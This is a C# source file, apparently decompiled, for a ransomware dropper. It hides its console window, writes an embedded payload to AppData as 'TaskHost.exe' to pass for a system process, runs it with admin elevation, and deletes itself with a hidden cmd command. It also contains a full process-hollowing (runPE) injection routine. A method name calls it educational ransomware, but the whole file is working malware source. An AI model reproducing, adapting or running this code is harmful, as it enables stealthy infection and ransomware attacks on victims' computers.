using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace x65454;

internal class Program
{
	private delegate int DelegateResumeThread(IntPtr handle);

	private delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context);

	private delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);

	private delegate bool DelegateWow64GetThreadContext(IntPtr thread, int[] context);

	private delegate bool DelegateGetThreadContext(IntPtr thread, int[] context);

	private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

	private delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

	private delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

	private delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress);

	private delegate bool DelegateCreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct ProcessInformation
	{
		public readonly IntPtr ProcessHandle;

		public readonly IntPtr ThreadHandle;

		public readonly uint ProcessId;

		private readonly uint ThreadId;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	private struct StartupInformation
	{
		public uint Size;

		private readonly string Reserved1;

		private readonly string Desktop;

		private readonly string Title;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
		private readonly byte[] Misc;

		private readonly IntPtr Reserved2;

		private readonly IntPtr StdInput;

		private readonly IntPtr StdOutput;

		private readonly IntPtr StdError;
	}

	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	private static readonly DelegateResumeThread ResumeThread = LoadApi<DelegateResumeThread>("kernel32", "ResumeThread");

	private static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = LoadApi<DelegateWow64SetThreadContext>("kernel32", "Wow64SetThreadContext");

	private static readonly DelegateSetThreadContext SetThreadContext = LoadApi<DelegateSetThreadContext>("kernel32", "SetThreadContext");

	private static readonly DelegateWow64GetThreadContext Wow64GetThreadContext = LoadApi<DelegateWow64GetThreadContext>("kernel32", "Wow64GetThreadContext");

	private static readonly DelegateGetThreadContext GetThreadContext = LoadApi<DelegateGetThreadContext>("kernel32", "GetThreadContext");

	private static readonly DelegateVirtualAllocEx VirtualAllocEx = LoadApi<DelegateVirtualAllocEx>("kernel32", "VirtualAllocEx");

	private static readonly DelegateWriteProcessMemory WriteProcessMemory = LoadApi<DelegateWriteProcessMemory>("kernel32", "WriteProcessMemory");

	private static readonly DelegateReadProcessMemory ReadProcessMemory = LoadApi<DelegateReadProcessMemory>("kernel32", "ReadProcessMemory");

	private static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection = LoadApi<DelegateZwUnmapViewOfSection>("ntdll", "ZwUnmapViewOfSection");

	private static readonly DelegateCreateProcessA CreateProcessA = LoadApi<DelegateCreateProcessA>("kernel32", "CreateProcessA");

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static void Main(string[] args)
	{
		IntPtr consoleWindow = GetConsoleWindow();
		ShowWindow(consoleWindow, 0);
		Loader("x65454", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "vged", "TaskHost.exe");
		Thread.Sleep(500);
		string fileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\TaskHost.exe";
		ProcessStartInfo processStartInfo = new ProcessStartInfo(fileName);
		processStartInfo.UseShellExecute = true;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.Verb = "runas";
		Process.Start(processStartInfo);
		RememberThatThisRansomwareIsCodedForEducationnalPurposes();
	}

	private static void Loader(string nmspace, string output, string indir, string name)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		using Stream stream = callingAssembly.GetManifestResourceStream(nmspace + "." + ((indir == "") ? "" : (indir + ".")) + name);
		using BinaryReader binaryReader = new BinaryReader(stream);
		using FileStream output2 = new FileStream(output + "\\" + name, FileMode.OpenOrCreate);
		using BinaryWriter binaryWriter = new BinaryWriter(output2);
		binaryWriter.Write(binaryReader.ReadBytes((int)stream.Length));
	}

	private static void RememberThatThisRansomwareIsCodedForEducationnalPurposes()
	{
		ProcessStartInfo startInfo = null;
		try
		{
			startInfo = new ProcessStartInfo
			{
				Arguments = "/C choice /C Y /N /D Y /T 1 & Del \"" + Process.GetCurrentProcess().MainModule!.FileName + "\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe"
			};
		}
		catch
		{
		}
		finally
		{
			Process.Start(startInfo);
			Environment.Exit(0);
		}
	}

	[DllImport("kernel32", SetLastError = true)]
	private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

	private static CreateApi LoadApi<CreateApi>(string name, string method)
	{
		return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
	}

	public static void runPE(string path, byte[] payload)
	{
		Console.WriteLine("For next update! :D");
		for (int i = 0; i < 5; i++)
		{
			int bytesRead = 0;
			StartupInformation startupInfo = default(StartupInformation);
			ProcessInformation processInformation = default(ProcessInformation);
			startupInfo.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
			try
			{
				if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, inheritHandles: false, 134217732u, IntPtr.Zero, null, ref startupInfo, ref processInformation))
				{
					throw new Exception();
				}
				int num = BitConverter.ToInt32(payload, 60);
				int num2 = BitConverter.ToInt32(payload, num + 52);
				int[] array = new int[179];
				array[0] = 65538;
				if (IntPtr.Size == 4)
				{
					if (!GetThreadContext(processInformation.ThreadHandle, array))
					{
						throw new Exception();
					}
				}
				else if (!Wow64GetThreadContext(processInformation.ThreadHandle, array))
				{
					throw new Exception();
				}
				int num3 = array[41];
				int buffer = 0;
				if (!ReadProcessMemory(processInformation.ProcessHandle, num3 + 8, ref buffer, 4, ref bytesRead))
				{
					throw new Exception();
				}
				if (num2 == buffer && ZwUnmapViewOfSection(processInformation.ProcessHandle, buffer) != 0)
				{
					throw new Exception();
				}
				int length = BitConverter.ToInt32(payload, num + 80);
				int bufferSize = BitConverter.ToInt32(payload, num + 84);
				bool flag = false;
				int num4 = VirtualAllocEx(processInformation.ProcessHandle, num2, length, 12288, 64);
				if (num4 == 0)
				{
					throw new Exception();
				}
				if (!WriteProcessMemory(processInformation.ProcessHandle, num4, payload, bufferSize, ref bytesRead))
				{
					throw new Exception();
				}
				int num5 = num + 248;
				short num6 = BitConverter.ToInt16(payload, num + 6);
				int num7 = 0;
				while (true)
				{
					if (num7 < num6)
					{
						int num8 = BitConverter.ToInt32(payload, num5 + 12);
						int num9 = BitConverter.ToInt32(payload, num5 + 16);
						int srcOffset = BitConverter.ToInt32(payload, num5 + 20);
						if (num9 != 0)
						{
							byte[] array2 = new byte[num9];
							Buffer.BlockCopy(payload, srcOffset, array2, 0, array2.Length);
							if (!WriteProcessMemory(processInformation.ProcessHandle, num4 + num8, array2, array2.Length, ref bytesRead))
							{
								throw new Exception();
							}
						}
						num5 += 40;
						num7++;
						continue;
					}
					byte[] bytes = BitConverter.GetBytes(num4);
					if (!WriteProcessMemory(processInformation.ProcessHandle, num3 + 8, bytes, 4, ref bytesRead))
					{
						throw new Exception();
					}
					int num10 = BitConverter.ToInt32(payload, num + 40);
					if (flag)
					{
						num4 = num2;
					}
					array[44] = num4 + num10;
					if (IntPtr.Size == 4)
					{
						if (!SetThreadContext(processInformation.ThreadHandle, array))
						{
							throw new Exception();
						}
					}
					else if (!Wow64SetThreadContext(processInformation.ThreadHandle, array))
					{
						throw new Exception();
					}
					if (ResumeThread(processInformation.ThreadHandle) == -1)
					{
						throw new Exception();
					}
					break;
				}
				break;
			}
			catch
			{
				Process.GetProcessById(Convert.ToInt32(processInformation.ProcessId)).Kill();
			}
		}
	}
}
